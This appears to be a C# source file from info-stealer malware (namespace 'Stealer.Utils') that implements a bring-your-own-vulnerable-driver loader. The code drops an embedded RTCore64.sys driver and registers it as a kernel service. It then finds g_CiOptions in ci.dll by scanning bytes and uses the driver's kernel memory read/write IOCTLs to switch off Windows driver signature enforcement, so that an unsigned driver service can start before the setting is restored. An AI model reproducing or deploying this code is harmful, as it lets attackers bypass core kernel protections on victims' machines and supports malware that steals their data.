using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace Stealer.Utils
{
    internal static class BYOVDLoader
    {
        // ── Win32 / Native APIs ────────────────────────────────────────────────

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtQuerySystemInformation(
            int SystemInformationClass,
            IntPtr SystemInformation,
            int SystemInformationLength,
            out int ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateFile(
            string lpFileName, uint dwAccess, uint dwShare,
            IntPtr lpSA, uint dwCreation, uint dwFlags, IntPtr hTemplate);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeviceIoControl(
            IntPtr hDev, uint dwCode,
            IntPtr lpIn, int nIn,
            IntPtr lpOut, int nOut,
            out int lpBytesReturned, IntPtr lpOverlapped);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr OpenSCManager(string machine, string db, uint access);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateService(
            IntPtr hSCM, string name, string display, uint access,
            uint type, uint start, uint error,
            string binaryPath, string loadGroup, IntPtr tagId,
            string deps, string account, string password);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr OpenService(IntPtr hSCM, string name, uint access);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool StartService(IntPtr hSvc, uint argc, string[] argv);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DeleteService(IntPtr hSvc);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CloseServiceHandle(IntPtr h);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ControlService(IntPtr hSvc, uint ctrl, ref SERVICE_STATUS status);

        [StructLayout(LayoutKind.Sequential)]
        private struct SERVICE_STATUS
        {
            public uint dwServiceType, dwCurrentState, dwControlsAccepted;
            public uint dwWin32ExitCode, dwServiceSpecificExitCode;
            public uint dwCheckPoint, dwWaitHint;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_MODULE_INFORMATION_ENTRY
        {
            public IntPtr Section;
            public IntPtr MappedBase;
            public IntPtr ImageBase;
            public uint ImageSize;
            public uint Flags;
            public ushort LoadOrderIndex;
            public ushort InitOrderIndex;
            public ushort LoadCount;
            public ushort OffsetToFileName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string FullPathName;
        }

        // RTCore64 IOCTL struct
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct RTCORE64_READ_WRITE
        {
            public uint Unknown1;
            public ulong Address;
            public uint Unknown2;
            public uint Size;
            public uint Value;
            public uint Unknown3;
        }

        private const uint DONT_RESOLVE_DLL_REFERENCES = 0x00000001;
        private const int SystemModuleInformation = 11;
        private const uint GENERIC_READ_WRITE = 0xC0000000;
        private const uint FILE_SHARE_READ_WRITE = 3;
        private const uint OPEN_EXISTING = 3;

        private const uint SC_MANAGER_ALL = 0xF003F;
        private const uint SERVICE_ALL_ACCESS = 0xF01FF;
        private const uint SERVICE_KERNEL_DRIVER = 0x00000001;
        private const uint SERVICE_DEMAND_START = 0x00000003;
        private const uint SERVICE_ERROR_IGNORE = 0x00000000;
        private const uint SERVICE_CONTROL_STOP = 0x00000001;

        // RTCore64 IOCTLs
        private const uint RTCORE64_READ_IOCTL  = 0x80002048;
        private const uint RTCORE64_WRITE_IOCTL = 0x8000204C;

        private const string VULN_SERVICE_NAME = "RTCore64";
        private const string VULN_DEVICE_PATH  = @"\\.\RTCore64";

        // ── Public API ──────────────────────────────────────────────────────────

        public static bool DisableDSEAndStartService(IntPtr hSvc, out string errorMsg)
        {
            errorMsg = null;
            string vulnSysPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.System),
                "drivers", "RTCore64.sys");

            bool vulnLoaded = false;
            try
            {
                // 1. Extract embedded RTCore64.sys and start service
                byte[] vulnBytes = GetEmbeddedDriverBytes("RTCore64.dat");
                if (vulnBytes != null && vulnBytes.Length > 0)
                {
                    File.WriteAllBytes(vulnSysPath, vulnBytes);
                    vulnLoaded = StartVulnDriver(vulnSysPath, out errorMsg);
                }
                else
                {
                    errorMsg = "BYOVD: Embedded RTCore64.dat resource not found";
                    return false;
                }

                if (!vulnLoaded)
                {
                    vulnLoaded = DeviceExists(VULN_DEVICE_PATH);
                }

                if (!vulnLoaded)
                {
                    if (string.IsNullOrEmpty(errorMsg)) errorMsg = "BYOVD: Failed to load RTCore64 driver";
                    return false;
                }

                // 2. Find g_CiOptions kernel address
                IntPtr gCiOptionsKernelAddr = FindGCiOptionsAddress();
                if (gCiOptionsKernelAddr == IntPtr.Zero)
                {
                    errorMsg = "BYOVD: Failed to locate g_CiOptions symbol in ci.dll";
                    return false;
                }

                // 3. Read original g_CiOptions
                uint originalOptions = ReadKernelMemory32(gCiOptionsKernelAddr);

                // Write 0 to disable DSE
                if (!WriteKernelMemory32(gCiOptionsKernelAddr, 0))
                {
                    errorMsg = "BYOVD: WriteKernelMemory32 failed to clear g_CiOptions";
                    return false;
                }

                bool started = false;
                try
                {
                    started = StartService(hSvc, 0, null);
                    if (!started)
                    {
                        int sErr = Marshal.GetLastWin32Error();
                        if (sErr == 1056) started = true;
                        else errorMsg = "StartService failed after DSE patch (Win32 error " + sErr + ")";
                    }
                }
                finally
                {
                    // 4. Restore original g_CiOptions value
                    if (originalOptions != 0)
                    {
                        WriteKernelMemory32(gCiOptionsKernelAddr, originalOptions);
                    }
                    else
                    {
                        WriteKernelMemory32(gCiOptionsKernelAddr, 6);
                    }
                }

                return started;
            }
            catch (Exception ex)
            {
                errorMsg = "BYOVD Exception: " + ex.Message;
                return false;
            }
            finally
            {
                // 5. Cleanup vulnerable driver
                if (vulnLoaded)
                {
                    StopAndDeleteVulnDriver();
                    try { if (File.Exists(vulnSysPath)) File.Delete(vulnSysPath); } catch { }
                }
            }
        }

        // ── Helper Methods ──────────────────────────────────────────────────────

        private static byte[] GetEmbeddedDriverBytes(string resourceName)
        {
            try
            {
                Assembly asm = Assembly.GetExecutingAssembly();
                using (Stream s = asm.GetManifestResourceStream(resourceName))
                {
                    if (s == null) return null;
                    byte[] data = new byte[s.Length];
                    s.Read(data, 0, data.Length);
                    return data;
                }
            }
            catch { return null; }
        }

        private static bool StartVulnDriver(string sysPath, out string errorMsg)
        {
            errorMsg = null;
            IntPtr hSCM = OpenSCManager(null, null, SC_MANAGER_ALL);
            if (hSCM == IntPtr.Zero)
            {
                int scmErr = Marshal.GetLastWin32Error();
                errorMsg = scmErr == 5 ? "OpenSCManager failed: Access Denied (Administrator privileges required)" : ("OpenSCManager failed (Win32 error " + scmErr + ")");
                return false;
            }
            try
            {
                IntPtr hOld = OpenService(hSCM, VULN_SERVICE_NAME, SERVICE_ALL_ACCESS);
                if (hOld != IntPtr.Zero)
                {
                    var st = new SERVICE_STATUS();
                    ControlService(hOld, SERVICE_CONTROL_STOP, ref st);
                    Thread.Sleep(200);
                    DeleteService(hOld);
                    CloseServiceHandle(hOld);
                }

                IntPtr hSvc = CreateService(
                    hSCM, VULN_SERVICE_NAME, VULN_SERVICE_NAME,
                    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                    SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                    sysPath, null, IntPtr.Zero, null, null, null);

                if (hSvc == IntPtr.Zero)
                {
                    int cErr = Marshal.GetLastWin32Error();
                    errorMsg = "CreateService RTCore64 failed (Win32 error " + cErr + ")";
                    return false;
                }
                try
                {
                    bool ok = StartService(hSvc, 0, null);
                    int err = Marshal.GetLastWin32Error();
                    if (!ok && err != 1056)
                    {
                        errorMsg = "StartService RTCore64 failed (Win32 error " + err + ")";
                    }
                    return ok || err == 1056;
                }
                finally { CloseServiceHandle(hSvc); }
            }
            finally { CloseServiceHandle(hSCM); }
        }

        private static void StopAndDeleteVulnDriver()
        {
            IntPtr hSCM = OpenSCManager(null, null, SC_MANAGER_ALL);
            if (hSCM == IntPtr.Zero) return;
            try
            {
                IntPtr hSvc = OpenService(hSCM, VULN_SERVICE_NAME, SERVICE_ALL_ACCESS);
                if (hSvc == IntPtr.Zero) return;
                try
                {
                    var st = new SERVICE_STATUS();
                    ControlService(hSvc, SERVICE_CONTROL_STOP, ref st);
                    Thread.Sleep(300);
                    DeleteService(hSvc);
                }
                finally { CloseServiceHandle(hSvc); }
            }
            finally { CloseServiceHandle(hSCM); }
        }

        private static bool DeviceExists(string devicePath)
        {
            IntPtr h = CreateFile(devicePath, GENERIC_READ_WRITE,
                FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            if (h == IntPtr.Zero || h == new IntPtr(-1)) return false;
            CloseHandle(h);
            return true;
        }

        private static IntPtr FindGCiOptionsAddress()
        {
            IntPtr ciKernelBase = GetKernelModuleBase("ci.dll");
            if (ciKernelBase == IntPtr.Zero)
                return IntPtr.Zero;

            string system32Path = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string ciPath = Path.Combine(system32Path, "ci.dll");
            if (!File.Exists(ciPath)) return IntPtr.Zero;

            IntPtr userCiBase = LoadLibraryEx(ciPath, IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);
            if (userCiBase == IntPtr.Zero) return IntPtr.Zero;

            try
            {
                IntPtr ciInitializeAddr = GetProcAddress(userCiBase, "CiInitialize");
                IntPtr gCiOptionsUserAddr = IntPtr.Zero;

                if (ciInitializeAddr != IntPtr.Zero)
                {
                    gCiOptionsUserAddr = ScanForGCiOptions(ciInitializeAddr, 0x100);
                }

                if (gCiOptionsUserAddr == IntPtr.Zero)
                {
                    gCiOptionsUserAddr = ScanModuleForGCiOptionsPattern(userCiBase);
                }

                if (gCiOptionsUserAddr == IntPtr.Zero) return IntPtr.Zero;

                long offset = (long)gCiOptionsUserAddr - (long)userCiBase;
                return new IntPtr((long)ciKernelBase + offset);
            }
            finally
            {
                FreeLibrary(userCiBase);
            }
        }

        private static IntPtr GetKernelModuleBase(string moduleName)
        {
            int size = 0;
            NtQuerySystemInformation(SystemModuleInformation, IntPtr.Zero, 0, out size);
            if (size == 0) return IntPtr.Zero;

            IntPtr buffer = Marshal.AllocHGlobal(size);
            try
            {
                if (NtQuerySystemInformation(SystemModuleInformation, buffer, size, out size) != 0)
                    return IntPtr.Zero;

                int moduleCount = Marshal.ReadInt32(buffer);
                IntPtr currentModule = new IntPtr(buffer.ToInt64() + 8);

                for (int i = 0; i < moduleCount; i++)
                {
                    SYSTEM_MODULE_INFORMATION_ENTRY entry =
                        (SYSTEM_MODULE_INFORMATION_ENTRY)Marshal.PtrToStructure(
                            currentModule, typeof(SYSTEM_MODULE_INFORMATION_ENTRY));

                    string name = Path.GetFileName(entry.FullPathName);
                    if (string.Equals(name, moduleName, StringComparison.OrdinalIgnoreCase))
                    {
                        return entry.ImageBase;
                    }

                    currentModule = new IntPtr(currentModule.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_MODULE_INFORMATION_ENTRY)));
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }

            return IntPtr.Zero;
        }

        private static IntPtr ScanForGCiOptions(IntPtr baseAddr, int maxOffset)
        {
            byte[] code = new byte[maxOffset];
            Marshal.Copy(baseAddr, code, 0, maxOffset);

            for (int i = 0; i < maxOffset - 6; i++)
            {
                if ((code[i] == 0x89 || code[i] == 0x8B) && (code[i + 1] & 0xC7) == 0x05)
                {
                    int rel = BitConverter.ToInt32(code, i + 2);
                    IntPtr nextInstr = new IntPtr(baseAddr.ToInt64() + i + 6);
                    IntPtr target = new IntPtr(nextInstr.ToInt64() + rel);
                    return target;
                }
            }
            return IntPtr.Zero;
        }

        private static IntPtr ScanModuleForGCiOptionsPattern(IntPtr userBase)
        {
            IntPtr exportAddr = GetProcAddress(userBase, "CiFreePolicyInfo");
            if (exportAddr != IntPtr.Zero)
            {
                return ScanForGCiOptions(exportAddr, 0x80);
            }
            return IntPtr.Zero;
        }

        private static uint ReadKernelMemory32(IntPtr kernelAddr)
        {
            IntPtr hDev = CreateFile(VULN_DEVICE_PATH, GENERIC_READ_WRITE,
                FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);

            if (hDev == IntPtr.Zero || hDev == new IntPtr(-1))
            {
                return 0;
            }

            try
            {
                RTCORE64_READ_WRITE req = new RTCORE64_READ_WRITE
                {
                    Address = (ulong)kernelAddr.ToInt64(),
                    Size = 4
                };

                int size = Marshal.SizeOf(req);
                IntPtr pReq = Marshal.AllocHGlobal(size);
                try
                {
                    Marshal.StructureToPtr(req, pReq, false);
                    int bytesReturned;
                    if (DeviceIoControl(hDev, RTCORE64_READ_IOCTL, pReq, size, pReq, size, out bytesReturned, IntPtr.Zero))
                    {
                        RTCORE64_READ_WRITE res = (RTCORE64_READ_WRITE)Marshal.PtrToStructure(pReq, typeof(RTCORE64_READ_WRITE));
                        return res.Value;
                    }
                }
                finally { Marshal.FreeHGlobal(pReq); }
            }
            finally { CloseHandle(hDev); }

            return 0;
        }

        private static bool WriteKernelMemory32(IntPtr kernelAddr, uint value)
        {
            IntPtr hDev = CreateFile(VULN_DEVICE_PATH, GENERIC_READ_WRITE,
                FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);

            if (hDev == IntPtr.Zero || hDev == new IntPtr(-1))
            {
                return false;
            }

            try
            {
                RTCORE64_READ_WRITE req = new RTCORE64_READ_WRITE
                {
                    Address = (ulong)kernelAddr.ToInt64(),
                    Size = 4,
                    Value = value
                };

                int size = Marshal.SizeOf(req);
                IntPtr pReq = Marshal.AllocHGlobal(size);
                try
                {
                    Marshal.StructureToPtr(req, pReq, false);
                    int bytesReturned;
                    return DeviceIoControl(hDev, RTCORE64_WRITE_IOCTL, pReq, size, pReq, size, out bytesReturned, IntPtr.Zero);
                }
                finally { Marshal.FreeHGlobal(pReq); }
            }
            finally { CloseHandle(hDev); }
        }
    }
}
